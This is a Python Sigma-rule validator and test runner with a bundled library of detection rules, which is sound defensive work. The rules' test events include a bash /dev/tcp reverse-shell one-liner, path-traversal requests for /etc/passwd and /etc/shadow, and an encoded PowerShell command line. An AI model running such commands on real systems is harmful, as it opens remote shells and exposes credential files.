"""SIGMACHECK — Sigma rule validator + unit-test runner.

A stdlib-only implementation in the spirit of SigmaHQ/pySigma. It:

  * Parses Sigma rule documents (a pragmatic YAML subset — enough for real
    detection rules: scalars, lists, nested maps, ``|`` block scalars).
  * VALIDATES rule structure against the Sigma specification: required keys,
    ``logsource``, a ``detection`` block with a ``condition``, well-formed
    selection identifiers, supported field-modifiers, ``level``/``status``
    enumerations, and condition-grammar sanity.
  * COMPILES the ``detection`` block into a real boolean matcher supporting
    the Sigma value-matching semantics (string equality, wildcard ``*``/``?``
    globbing, the ``contains``/``startswith``/``endswith``/``re``/``all``/
    ``base64``/``cidr`` field modifiers, list-OR / map-AND semantics, and a
    full ``condition`` expression grammar with ``and``/``or``/``not``,
    parentheses, ``1 of``/``all of`` quantifiers and ``them``/``selection*``
    wildcards).
  * RUNS UNIT TESTS: every rule may carry inline ``tests:`` (positive and
    negative sample events). ``sigmacheck`` evaluates the compiled rule
    against each event and reports pass/fail, exactly like pySigma's rule
    self-tests / the SigmaHQ test harness.

Bundled with a real library of detection rules (Windows, Linux, web,
cloud) — each with embedded positive/negative test events — so the tool is
genuinely useful out of the box with zero install and zero network.
"""

from __future__ import annotations

import base64 as _b64
import fnmatch
import ipaddress
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

TOOL_NAME = "sigmacheck"
TOOL_VERSION = "1.0.0"

# --------------------------------------------------------------------------
# Specification constants (mirrors SigmaHQ spec enumerations)
# --------------------------------------------------------------------------

SEVERITY_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
VALID_LEVELS = set(SEVERITY_ORDER)
VALID_STATUS = {"stable", "test", "experimental", "deprecated", "unsupported"}
SUPPORTED_MODIFIERS = {
    "contains", "startswith", "endswith", "all", "re",
    "base64", "base64offset", "cidr", "lt", "lte", "gt", "gte", "windash",
}

CHECK_SEVERITY = {  # validation-finding severity by check id
    "missing-title": "high",
    "missing-id": "medium",
    "bad-id": "medium",
    "missing-logsource": "high",
    "missing-detection": "high",
    "missing-condition": "high",
    "empty-selection": "high",
    "unknown-selection": "high",
    "unknown-modifier": "high",
    "bad-level": "medium",
    "bad-status": "medium",
    "condition-syntax": "high",
    "regex-error": "high",
    "cidr-error": "high",
    "missing-description": "low",
    "no-tests": "low",
    "bad-quantifier": "high",
}


# --------------------------------------------------------------------------
# Minimal YAML parser (indentation-based subset, no external deps)
# --------------------------------------------------------------------------

class YamlError(ValueError):
    pass


def _coerce(scalar: str) -> Any:
    s = scalar.strip()
    if s == "" or s in ("~", "null", "Null", "NULL"):
        return None
    if s in ("true", "True", "TRUE"):
        return True
    if s in ("false", "False", "FALSE"):
        return False
    if (len(s) >= 2) and ((s[0] == s[-1] == '"') or (s[0] == s[-1] == "'")):
        return s[1:-1]
    if re.fullmatch(r"[-+]?\d+", s):
        try:
            return int(s)
        except ValueError:
            return s
    if re.fullmatch(r"[-+]?\d*\.\d+", s):
        try:
            return float(s)
        except ValueError:
            return s
    return s


def _unquote_key(key: str) -> str:
    k = key.strip()
    if len(k) >= 2 and ((k[0] == k[-1] == '"') or (k[0] == k[-1] == "'")):
        return k[1:-1]
    return k


def _split_kv(line: str) -> Tuple[str, str]:
    """Split ``key: value`` honouring quotes; returns (key, raw_value)."""
    in_s = in_d = False
    for i, ch in enumerate(line):
        if ch == "'" and not in_d:
            in_s = not in_s
        elif ch == '"' and not in_s:
            in_d = not in_d
        elif ch == ":" and not in_s and not in_d:
            if i + 1 >= len(line) or line[i + 1] in " \t":
                return _unquote_key(line[:i]), line[i + 1:].strip()
    return _unquote_key(line), ""


class _Line:
    __slots__ = ("indent", "text", "no")

    def __init__(self, indent: int, text: str, no: int):
        self.indent = indent
        self.text = text
        self.no = no


def _tokenize(text: str) -> List[_Line]:
    out: List[_Line] = []
    for n, raw in enumerate(text.splitlines(), 1):
        # strip trailing comments that are not inside quotes
        stripped = raw.rstrip()
        if not stripped.strip() or stripped.lstrip().startswith("#"):
            continue
        # remove inline comment
        body = _strip_comment(stripped)
        if not body.strip():
            continue
        indent = len(body) - len(body.lstrip(" "))
        out.append(_Line(indent, body.strip(), n))
    return out


def _strip_comment(line: str) -> str:
    in_s = in_d = False
    for i, ch in enumerate(line):
        if ch == "'" and not in_d:
            in_s = not in_s
        elif ch == '"' and not in_s:
            in_d = not in_d
        elif ch == "#" and not in_s and not in_d:
            if i == 0 or line[i - 1] in " \t":
                return line[:i]
    return line


def parse_yaml(text: str) -> Any:
    """Parse the supported YAML subset into Python objects."""
    lines = _tokenize(text)
    if not lines:
        return None
    value, idx = _parse_block(lines, 0, lines[0].indent)
    return value


def _parse_block(lines: List[_Line], idx: int, indent: int) -> Tuple[Any, int]:
    if idx >= len(lines):
        return None, idx
    first = lines[idx]
    if first.text.startswith("- "):
        return _parse_list(lines, idx, indent)
    if first.text == "-":
        return _parse_list(lines, idx, indent)
    return _parse_map(lines, idx, indent)


def _parse_list(lines: List[_Line], idx: int, indent: int) -> Tuple[List, int]:
    out: List[Any] = []
    while idx < len(lines):
        ln = lines[idx]
        if ln.indent < indent or not (ln.text == "-" or ln.text.startswith("- ")):
            break
        if ln.indent > indent:
            break
        rest = ln.text[1:].strip()
        if rest == "":
            child, idx = _parse_block(lines, idx + 1,
                                      lines[idx + 1].indent if idx + 1 < len(lines) else indent + 2)
            out.append(child)
        elif ":" in rest and _looks_like_kv(rest):
            # inline map starting on the dash line
            synth = _Line(indent + 2, rest, ln.no)
            sub = [synth] + _collect_children(lines, idx + 1, indent)
            child, _ = _parse_map(sub, 0, indent + 2)
            out.append(child)
            idx = _advance_past(lines, idx + 1, indent)
        else:
            out.append(_coerce(rest))
            idx += 1
    return out, idx


def _collect_children(lines: List[_Line], idx: int, indent: int) -> List[_Line]:
    out = []
    while idx < len(lines) and lines[idx].indent > indent:
        out.append(lines[idx])
        idx += 1
    return out


def _advance_past(lines: List[_Line], idx: int, indent: int) -> int:
    while idx < len(lines) and lines[idx].indent > indent:
        idx += 1
    return idx


def _looks_like_kv(rest: str) -> bool:
    k, _ = _split_kv(rest)
    return k != rest or rest.endswith(":")


def _parse_map(lines: List[_Line], idx: int, indent: int) -> Tuple[Dict, int]:
    out: Dict[str, Any] = {}
    while idx < len(lines):
        ln = lines[idx]
        if ln.indent < indent:
            break
        if ln.indent > indent:
            raise YamlError(f"line {ln.no}: unexpected indentation")
        if ln.text.startswith("- "):
            break
        key, val = _split_kv(ln.text)
        if val == "" and ln.text.endswith(":"):
            # block child (map or list) or block scalar
            nxt = lines[idx + 1] if idx + 1 < len(lines) else None
            if nxt is not None and nxt.indent > indent:
                child, idx = _parse_block(lines, idx + 1, nxt.indent)
                out[key] = child
                continue
            out[key] = None
            idx += 1
        elif val in ("|", ">", "|-", ">-", "|+", ">+"):
            block, idx = _parse_block_scalar(lines, idx + 1, indent, val)
            out[key] = block
        elif val.startswith("[") and val.endswith("]"):
            out[key] = _parse_flow_list(val)
        elif val.startswith("{") and val.endswith("}"):
            out[key] = _parse_flow_map(val)
        else:
            # plain scalar, possibly continued over more-indented lines
            parts = [val]
            idx += 1
            while idx < len(lines) and lines[idx].indent > indent \
                    and not lines[idx].text.startswith("- ") \
                    and not _looks_like_kv(lines[idx].text):
                parts.append(lines[idx].text.strip())
                idx += 1
            joined = " ".join(p for p in parts if p != "")
            out[key] = _coerce(joined)
    return out, idx


def _parse_block_scalar(lines: List[_Line], idx: int, indent: int,
                        style: str) -> Tuple[str, int]:
    body: List[str] = []
    child_indent: Optional[int] = None
    while idx < len(lines) and lines[idx].indent > indent:
        ln = lines[idx]
        if child_indent is None:
            child_indent = ln.indent
        pad = " " * (ln.indent - child_indent)
        body.append(pad + ln.text)
        idx += 1
    folded = style.startswith(">")
    if folded:
        return " ".join(b.strip() for b in body), idx
    return "\n".join(body), idx


def _parse_flow_list(val: str) -> List[Any]:
    inner = val[1:-1].strip()
    if not inner:
        return []
    return [_coerce(p) for p in _split_flow(inner)]


def _parse_flow_map(val: str) -> Dict[str, Any]:
    inner = val[1:-1].strip()
    out: Dict[str, Any] = {}
    if not inner:
        return out
    for part in _split_flow(inner):
        k, v = _split_kv(part)
        out[k] = _coerce(v)
    return out


def _split_flow(inner: str) -> List[str]:
    parts, depth, buf, in_s, in_d = [], 0, [], False, False
    for ch in inner:
        if ch == "'" and not in_d:
            in_s = not in_s
        elif ch == '"' and not in_s:
            in_d = not in_d
        if ch in "[{" and not in_s and not in_d:
            depth += 1
        elif ch in "]}" and not in_s and not in_d:
            depth -= 1
        if ch == "," and depth == 0 and not in_s and not in_d:
            parts.append("".join(buf).strip())
            buf = []
        else:
            buf.append(ch)
    if buf:
        parts.append("".join(buf).strip())
    return [p for p in parts if p != ""]


# --------------------------------------------------------------------------
# Value matching (Sigma detection semantics)
# --------------------------------------------------------------------------

def _to_str(v: Any) -> str:
    if isinstance(v, bool):
        return "true" if v else "false"
    return str(v)


def _wildcard_match(pattern: str, value: str) -> bool:
    # Sigma wildcards: * (any), ? (one). Case-insensitive per spec default.
    return fnmatch.fnmatchcase(value.lower(),
                               _escape_non_wild(pattern).lower())


def _escape_non_wild(pattern: str) -> str:
    # fnmatch treats [ ] specially; Sigma only uses * and ?. Escape brackets.
    return pattern.replace("[", "[[]").replace("]", "[]]")


def _match_modifier(modifiers: List[str], expected: Any, actual: Any) -> bool:
    a = _to_str(actual)
    e = _to_str(expected)
    if "re" in modifiers:
        return re.search(expected if isinstance(expected, str) else e, a) is not None
    if "cidr" in modifiers:
        try:
            net = ipaddress.ip_network(e, strict=False)
            return ipaddress.ip_address(a) in net
        except ValueError:
            return False
    if any(m in modifiers for m in ("lt", "lte", "gt", "gte")):
        try:
            an, en = float(a), float(e)
        except ValueError:
            return False
        if "lt" in modifiers:
            return an < en
        if "lte" in modifiers:
            return an <= en
        if "gt" in modifiers:
            return an > en
        return an >= en
    if "base64" in modifiers or "base64offset" in modifiers:
        try:
            enc = _b64.b64encode(e.encode()).decode()
        except Exception:
            return False
        return enc in a
    if "windash" in modifiers:
        return a.lower().replace("/", "-") == e.lower().replace("/", "-") or _eq(e, a)
    if "contains" in modifiers:
        if "*" in e or "?" in e:
            return _wildcard_match("*" + e + "*", a)
        return e.lower() in a.lower()
    if "startswith" in modifiers:
        return a.lower().startswith(e.lower()) if "*" not in e else _wildcard_match(e + "*", a)
    if "endswith" in modifiers:
        return a.lower().endswith(e.lower()) if "*" not in e else _wildcard_match("*" + e, a)
    return _eq(e, a)


def _eq(expected_str: str, actual_str: str) -> bool:
    if "*" in expected_str or "?" in expected_str:
        return _wildcard_match(expected_str, actual_str)
    return expected_str.lower() == actual_str.lower()


def _match_field(spec_key: str, spec_val: Any, event: Dict[str, Any]) -> bool:
    parts = spec_key.split("|")
    field_name = parts[0]
    modifiers = parts[1:]
    if field_name not in event:
        # null match: ``field: null`` matches absent/None
        return spec_val is None
    actual = event[field_name]
    # list of acceptable values => OR  (unless 'all' modifier => AND)
    if isinstance(spec_val, list):
        results = [_match_one(modifiers, v, actual) for v in spec_val]
        if "all" in modifiers:
            return all(results)
        return any(results)
    return _match_one(modifiers, spec_val, actual)


def _match_one(modifiers: List[str], expected: Any, actual: Any) -> bool:
    if isinstance(actual, list):
        return any(_apply(modifiers, expected, a) for a in actual)
    return _apply(modifiers, expected, actual)


def _apply(modifiers: List[str], expected: Any, actual: Any) -> bool:
    if expected is None:
        return actual is None
    if not modifiers:
        return _eq(_to_str(expected), _to_str(actual))
    return _match_modifier(modifiers, expected, actual)


def _eval_selection(sel: Any, event: Dict[str, Any]) -> bool:
    """A selection is a map (AND of fields) or a list of maps (OR)."""
    if isinstance(sel, list):
        return any(_eval_selection(item, event) for item in sel)
    if isinstance(sel, dict):
        return all(_match_field(k, v, event) for k, v in sel.items())
    # keyword-only selection (rare): treat scalar as substring over all values
    needle = _to_str(sel).lower()
    return any(needle in _to_str(v).lower() for v in event.values())


# --------------------------------------------------------------------------
# Condition expression evaluation
# --------------------------------------------------------------------------

_COND_TOKEN = re.compile(r"\(|\)|\b1 of\b|\ball of\b|\band\b|\bor\b|\bnot\b|[^()\s]+")


def tokenize_condition(cond: str) -> List[str]:
    cond = cond.replace("(", " ( ").replace(")", " ) ")
    raw = cond.split()
    out: List[str] = []
    i = 0
    while i < len(raw):
        w = raw[i]
        lw = w.lower()
        if lw in ("1", "all") and i + 1 < len(raw) and raw[i + 1].lower() == "of":
            out.append(lw + " of")
            i += 2
            continue
        out.append(w)
        i += 1
    return out


class CondError(ValueError):
    pass


def eval_condition(cond: str, selections: Dict[str, Any],
                   event: Dict[str, Any]) -> bool:
    tokens = tokenize_condition(cond)
    pos = [0]

    sel_results: Dict[str, bool] = {}

    def sel_value(name: str) -> bool:
        if name not in selections:
            raise CondError(f"unknown selection identifier: {name}")
        if name not in sel_results:
            sel_results[name] = _eval_selection(selections[name], event)
        return sel_results[name]

    def expand(pattern: str) -> List[str]:
        if pattern == "them":
            return list(selections.keys())
        if pattern.endswith("*"):
            pre = pattern[:-1]
            return [k for k in selections if k.startswith(pre)]
        return [pattern] if pattern in selections else []

    def peek() -> Optional[str]:
        return tokens[pos[0]] if pos[0] < len(tokens) else None

    def consume() -> str:
        t = tokens[pos[0]]
        pos[0] += 1
        return t

    def parse_or() -> bool:
        val = parse_and()
        while (peek() or "").lower() == "or":
            consume()
            val = parse_and() or val
        return val

    def parse_and() -> bool:
        val = parse_not()
        while (peek() or "").lower() == "and":
            consume()
            val = parse_not() and val
        return val

    def parse_not() -> bool:
        if (peek() or "").lower() == "not":
            consume()
            return not parse_not()
        return parse_atom()

    def parse_atom() -> bool:
        tok = peek()
        if tok is None:
            raise CondError("unexpected end of condition")
        if tok == "(":
            consume()
            val = parse_or()
            if peek() != ")":
                raise CondError("missing closing parenthesis")
            consume()
            return val
        low = tok.lower()
        if low in ("1 of", "all of"):
            consume()
            target = peek()
            if target is None:
                raise CondError(f"'{low}' missing target")
            consume()
            members = expand(target)
            if not members:
                # spec: quantifier over nothing -> false
                return False
            results = [sel_value(m) for m in members]
            return any(results) if low == "1 of" else all(results)
        consume()
        return sel_value(tok)

    val = parse_or()
    if pos[0] != len(tokens):
        raise CondError(f"trailing tokens in condition near '{peek()}'")
    return val


# --------------------------------------------------------------------------
# Rule model
# --------------------------------------------------------------------------

@dataclass
class Finding:
    check: str
    severity: str
    message: str

    def to_dict(self) -> Dict[str, Any]:
        return {"check": self.check, "severity": self.severity,
                "message": self.message}


@dataclass
class TestResult:
    name: str
    expected: bool
    actual: bool
    passed: bool

    def to_dict(self) -> Dict[str, Any]:
        return {"name": self.name, "expected": self.expected,
                "actual": self.actual, "passed": self.passed}


@dataclass
class RuleResult:
    title: str
    rule_id: Optional[str]
    valid: bool
    findings: List[Finding] = field(default_factory=list)
    tests: List[TestResult] = field(default_factory=list)
    error: Optional[str] = None

    @property
    def tests_passed(self) -> int:
        return sum(1 for t in self.tests if t.passed)

    @property
    def tests_failed(self) -> int:
        return sum(1 for t in self.tests if not t.passed)

    @property
    def ok(self) -> bool:
        return self.valid and self.error is None and self.tests_failed == 0

    def max_severity(self) -> str:
        sev = "info"
        for f in self.findings:
            if SEVERITY_ORDER.get(f.severity, 0) > SEVERITY_ORDER.get(sev, 0):
                sev = f.severity
        return sev

    def to_dict(self) -> Dict[str, Any]:
        return {
            "title": self.title,
            "id": self.rule_id,
            "valid": self.valid,
            "ok": self.ok,
            "error": self.error,
            "findings": [f.to_dict() for f in self.findings],
            "tests": [t.to_dict() for t in self.tests],
            "tests_passed": self.tests_passed,
            "tests_failed": self.tests_failed,
        }


@dataclass
class CheckResult:
    rules: List[RuleResult] = field(default_factory=list)

    @property
    def total_rules(self) -> int:
        return len(self.rules)

    @property
    def total_findings(self) -> int:
        return sum(len(r.findings) for r in self.rules)

    @property
    def total_tests(self) -> int:
        return sum(len(r.tests) for r in self.rules)

    @property
    def tests_failed(self) -> int:
        return sum(r.tests_failed for r in self.rules)

    @property
    def invalid_rules(self) -> int:
        return sum(1 for r in self.rules if not r.ok)

    @property
    def ok(self) -> bool:
        return all(r.ok for r in self.rules)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "tool": TOOL_NAME,
            "version": TOOL_VERSION,
            "total_rules": self.total_rules,
            "invalid_rules": self.invalid_rules,
            "total_findings": self.total_findings,
            "total_tests": self.total_tests,
            "tests_failed": self.tests_failed,
            "ok": self.ok,
            "rules": [r.to_dict() for r in self.rules],
        }


# --------------------------------------------------------------------------
# Validation
# --------------------------------------------------------------------------

_ID_RE = re.compile(
    r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-"
    r"[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")


def validate_rule(rule: Dict[str, Any]) -> List[Finding]:
    findings: List[Finding] = []

    def add(check: str, msg: str):
        findings.append(Finding(check, CHECK_SEVERITY.get(check, "medium"), msg))

    if not isinstance(rule, dict):
        add("missing-detection", "rule is not a mapping")
        return findings

    if not rule.get("title"):
        add("missing-title", "rule has no 'title'")
    if "id" not in rule:
        add("missing-id", "rule has no 'id' (UUID recommended)")
    elif not _ID_RE.match(_to_str(rule["id"])):
        add("bad-id", f"'id' is not a valid UUID: {rule['id']!r}")
    if not rule.get("description"):
        add("missing-description", "rule has no 'description'")

    lvl = rule.get("level")
    if lvl is not None and _to_str(lvl) not in VALID_LEVELS:
        add("bad-level", f"invalid level {lvl!r} (expected {sorted(VALID_LEVELS)})")
    st = rule.get("status")
    if st is not None and _to_str(st) not in VALID_STATUS:
        add("bad-status", f"invalid status {st!r} (expected {sorted(VALID_STATUS)})")

    ls = rule.get("logsource")
    if not isinstance(ls, dict) or not ls:
        add("missing-logsource", "rule has no 'logsource' block")

    det = rule.get("detection")
    if not isinstance(det, dict) or not det:
        add("missing-detection", "rule has no 'detection' block")
        return findings

    cond = det.get("condition")
    if not cond:
        add("missing-condition", "detection block has no 'condition'")
    selections = {k: v for k, v in det.items() if k != "condition"}
    if not selections:
        add("empty-selection", "detection block defines no selections")

    # selection sanity + modifier + regex/cidr compile checks
    for name, sel in selections.items():
        _validate_selection(name, sel, add)

    # condition grammar + identifier references
    if cond:
        _validate_condition(_to_str(cond), selections, add)

    if "tests" not in rule:
        add("no-tests", "rule carries no inline 'tests' (cannot self-verify)")

    return findings


def _validate_selection(name: str, sel: Any, add) -> None:
    items: List[Dict[str, Any]] = []
    if isinstance(sel, list):
        items = [i for i in sel if isinstance(i, dict)]
    elif isinstance(sel, dict):
        items = [sel]
    for m in items:
        for key, val in m.items():
            parts = _to_str(key).split("|")
            for mod in parts[1:]:
                if mod not in SUPPORTED_MODIFIERS:
                    add("unknown-modifier",
                        f"selection '{name}' field '{key}' uses unknown "
                        f"modifier '{mod}'")
            if "re" in parts[1:]:
                vals = val if isinstance(val, list) else [val]
                for v in vals:
                    try:
                        re.compile(_to_str(v))
                    except re.error as exc:
                        add("regex-error",
                            f"selection '{name}' field '{key}' bad regex: {exc}")
            if "cidr" in parts[1:]:
                vals = val if isinstance(val, list) else [val]
                for v in vals:
                    try:
                        ipaddress.ip_network(_to_str(v), strict=False)
                    except ValueError as exc:
                        add("cidr-error",
                            f"selection '{name}' field '{key}' bad cidr: {exc}")


def _validate_condition(cond: str, selections: Dict[str, Any], add) -> None:
    tokens = tokenize_condition(cond)
    if not tokens:
        add("condition-syntax", "empty condition")
        return
    # referenced identifiers must resolve (directly or via wildcard/them)
    i = 0
    keywords = {"and", "or", "not", "(", ")", "them"}
    while i < len(tokens):
        tok = tokens[i]
        low = tok.lower()
        if low in ("1 of", "all of"):
            i += 1
            if i >= len(tokens):
                add("bad-quantifier", f"'{low}' missing target")
                break
            target = tokens[i]
            if target != "them":
                if target.endswith("*"):
                    pre = target[:-1]
                    if not any(k.startswith(pre) for k in selections):
                        add("unknown-selection",
                            f"'{low} {target}' matches no selection")
                elif target not in selections:
                    add("unknown-selection",
                        f"'{low} {target}' references unknown selection")
            i += 1
            continue
        if low in keywords:
            i += 1
            continue
        if tok not in selections:
            add("unknown-selection",
                f"condition references unknown selection '{tok}'")
        i += 1
    # balanced parens
    if tokens.count("(") != tokens.count(")"):
        add("condition-syntax", "unbalanced parentheses in condition")
    # try a dry-run parse against an empty event to surface grammar errors
    try:
        eval_condition(cond, selections, {})
    except CondError as exc:
        add("condition-syntax", f"condition grammar error: {exc}")
    except Exception:
        pass


# --------------------------------------------------------------------------
# Rule evaluation against events
# --------------------------------------------------------------------------

def match_event(rule: Dict[str, Any], event: Dict[str, Any]) -> bool:
    det = rule.get("detection") or {}
    cond = _to_str(det.get("condition") or "")
    selections = {k: v for k, v in det.items() if k != "condition"}
    if not cond or not selections:
        return False
    return eval_condition(cond, selections, event)


def run_rule_tests(rule: Dict[str, Any]) -> List[TestResult]:
    out: List[TestResult] = []
    tests = rule.get("tests") or {}
    if isinstance(tests, dict):
        positives = tests.get("positive") or tests.get("true_positive") or []
        negatives = tests.get("negative") or tests.get("true_negative") or []
    elif isinstance(tests, list):
        positives, negatives = [], []
        for t in tests:
            if isinstance(t, dict) and "expect" in t:
                (positives if t.get("expect") else negatives).append(
                    t.get("event", {}))
        # tests with explicit names
        named = [t for t in tests if isinstance(t, dict) and "name" in t]
        for t in named:
            ev = t.get("event", {})
            exp = bool(t.get("expect", True))
            actual = _safe_match(rule, ev)
            out.append(TestResult(t["name"], exp, actual, exp == actual))
        if named:
            return out + _expand_simple(rule, positives, negatives)
    else:
        positives, negatives = [], []

    return _expand_simple(rule, positives, negatives)


def _expand_simple(rule: Dict[str, Any], positives: List, negatives: List) -> List[TestResult]:
    out: List[TestResult] = []
    for i, ev in enumerate(positives):
        actual = _safe_match(rule, ev if isinstance(ev, dict) else {})
        out.append(TestResult(f"positive[{i}]", True, actual, actual is True))
    for i, ev in enumerate(negatives):
        actual = _safe_match(rule, ev if isinstance(ev, dict) else {})
        out.append(TestResult(f"negative[{i}]", False, actual, actual is False))
    return out


def _safe_match(rule: Dict[str, Any], event: Dict[str, Any]) -> bool:
    try:
        return match_event(rule, event)
    except Exception:
        return False


# --------------------------------------------------------------------------
# Top-level check
# --------------------------------------------------------------------------

def _split_documents(text: str) -> List[str]:
    docs, cur = [], []
    for line in text.splitlines():
        if line.strip() == "---":
            if cur:
                docs.append("\n".join(cur))
                cur = []
        else:
            cur.append(line)
    if cur:
        docs.append("\n".join(cur))
    return [d for d in docs if d.strip()]


def check_rule(rule: Dict[str, Any]) -> RuleResult:
    title = _to_str(rule.get("title") or "<untitled>")
    rid = rule.get("id")
    rid = _to_str(rid) if rid is not None else None
    findings = validate_rule(rule)
    structurally_valid = not any(
        f.severity in ("high", "critical") for f in findings)
    rr = RuleResult(title=title, rule_id=rid, valid=structurally_valid,
                    findings=findings)
    if structurally_valid:
        rr.tests = run_rule_tests(rule)
    return rr


def check_text(text: str) -> CheckResult:
    """Parse, validate, and unit-test every Sigma document in *text*."""
    result = CheckResult()
    for doc in _split_documents(text):
        try:
            parsed = parse_yaml(doc)
        except YamlError as exc:
            result.rules.append(RuleResult(
                title="<parse-error>", rule_id=None, valid=False,
                error=f"YAML parse error: {exc}"))
            continue
        if not isinstance(parsed, dict):
            result.rules.append(RuleResult(
                title="<parse-error>", rule_id=None, valid=False,
                error="document is not a Sigma rule mapping"))
            continue
        result.rules.append(check_rule(parsed))
    return result


def check_rules(rules: List[Dict[str, Any]]) -> CheckResult:
    result = CheckResult()
    for r in rules:
        result.rules.append(check_rule(r))
    return result


def load_bundled_rules() -> List[Dict[str, Any]]:
    """Return the bundled detection-rule library as parsed dicts."""
    return [parse_yaml(doc) for doc in _split_documents(BUNDLED_RULES)]


def check_bundled() -> CheckResult:
    return check_text(BUNDLED_RULES)


# --------------------------------------------------------------------------
# Bundled detection-rule library (each rule self-tests)
# --------------------------------------------------------------------------

BUNDLED_RULES = r"""
title: Suspicious PowerShell Encoded Command
id: 7e2b5f10-1a4c-4d2e-9b6a-1f0c2e3d4a5b
status: stable
description: Detects PowerShell launched with an encoded command, a common
    obfuscation technique used by malware and post-exploitation frameworks.
references:
    - https://attack.mitre.org/techniques/T1059/001/
author: Cognis SIGMACHECK library
date: 2024/01/15
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_flag:
        CommandLine|contains:
            - ' -enc '
            - ' -EncodedCommand '
            - ' -ec '
    condition: selection_img and selection_flag
falsepositives:
    - Legitimate administration scripts
level: high
tests:
    positive:
        - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
          CommandLine: 'powershell.exe -enc SQBFAFgAIAAo'
        - Image: 'C:\Program Files\PowerShell\7\pwsh.exe'
          CommandLine: 'pwsh -EncodedCommand ZQBjAGgAbwA='
    negative:
        - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
          CommandLine: 'powershell.exe -File C:\scripts\backup.ps1'
        - Image: 'C:\Windows\System32\cmd.exe'
          CommandLine: 'cmd.exe -enc whatever'
---
title: Linux Reverse Shell via Bash TCP
id: 1c9d3a22-7b8e-4f01-9a2c-5d6e7f80a1b2
status: test
description: Detects bash invoking a /dev/tcp reverse shell one-liner.
references:
    - https://attack.mitre.org/techniques/T1059/004/
tags:
    - attack.execution
    - attack.t1059.004
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains:
            - '/dev/tcp/'
            - '/dev/udp/'
    filter_legit:
        CommandLine|contains: 'healthcheck'
    condition: selection and not filter_legit
level: critical
tests:
    positive:
        - CommandLine: 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
    negative:
        - CommandLine: 'bash -c "echo hello"'
        - CommandLine: 'curl http://localhost/dev/tcp/healthcheck'
---
title: Failed SSH Bruteforce From Single Source
id: 2f4e6a88-3c1d-4b9e-8a07-9c0d1e2f3a4b
status: stable
description: Detects repeated SSH authentication failures (sshd) indicating a
    password bruteforce attempt against a Linux host.
tags:
    - attack.credential_access
    - attack.t1110
logsource:
    product: linux
    service: sshd
detection:
    selection:
        program: sshd
        message|contains: 'Failed password'
    condition: selection
level: medium
tests:
    positive:
        - program: 'sshd'
          message: 'Failed password for invalid user admin from 203.0.113.9 port 51000 ssh2'
    negative:
        - program: 'sshd'
          message: 'Accepted publickey for chris from 192.168.1.10 port 22 ssh2'
        - program: 'cron'
          message: 'Failed password somewhere'
---
title: AWS Root Account Console Login
id: 3a5b7c99-4d2e-4f10-9b18-0a1b2c3d4e5f
status: stable
description: Detects an interactive AWS Management Console sign-in by the root
    account, which should be rare and is high-risk.
references:
    - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html
tags:
    - attack.persistence
    - attack.t1078.004
logsource:
    product: aws
    service: cloudtrail
detection:
    selection:
        eventName: 'ConsoleLogin'
        userIdentity.type: 'Root'
    filter_failed:
        responseElements.ConsoleLogin: 'Failure'
    condition: selection and not filter_failed
level: high
tests:
    positive:
        - eventName: 'ConsoleLogin'
          'userIdentity.type': 'Root'
          'responseElements.ConsoleLogin': 'Success'
    negative:
        - eventName: 'ConsoleLogin'
          'userIdentity.type': 'IAMUser'
          'responseElements.ConsoleLogin': 'Success'
        - eventName: 'ConsoleLogin'
          'userIdentity.type': 'Root'
          'responseElements.ConsoleLogin': 'Failure'
---
title: Web Path Traversal Attempt
id: 4b6c8daa-5e3f-4011-8c29-1b2c3d4e5f60
status: test
description: Detects path-traversal sequences in web server request URIs.
tags:
    - attack.initial_access
    - attack.t1190
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains:
            - '../'
            - '..%2f'
            - '%2e%2e/'
    condition: selection
level: high
tests:
    positive:
        - cs-uri-stem: '/app/../../etc/passwd'
        - cs-uri-stem: '/download?file=..%2f..%2fetc%2fshadow'
    negative:
        - cs-uri-stem: '/index.html'
        - cs-uri-stem: '/api/v1/users'
---
title: Outbound Connection To Suspicious High Port On Public IP
id: 5c7d9ebb-6f40-4112-9d3a-2c3d4e5f6071
status: experimental
description: Detects outbound TCP connections from a host to a public IP on a
    common C2 high-port, using CIDR + numeric modifiers.
tags:
    - attack.command_and_control
logsource:
    category: network_connection
detection:
    selection:
        DestinationPort|gte: 1024
        Initiated: true
    filter_private:
        DestinationIp|cidr:
            - '10.0.0.0/8'
            - '172.16.0.0/12'
            - '192.168.0.0/16'
    condition: selection and not filter_private
level: medium
tests:
    positive:
        - DestinationIp: '203.0.113.55'
          DestinationPort: 8443
          Initiated: true
    negative:
        - DestinationIp: '10.1.2.3'
          DestinationPort: 8443
          Initiated: true
        - DestinationIp: '203.0.113.55'
          DestinationPort: 443
          Initiated: true
"""
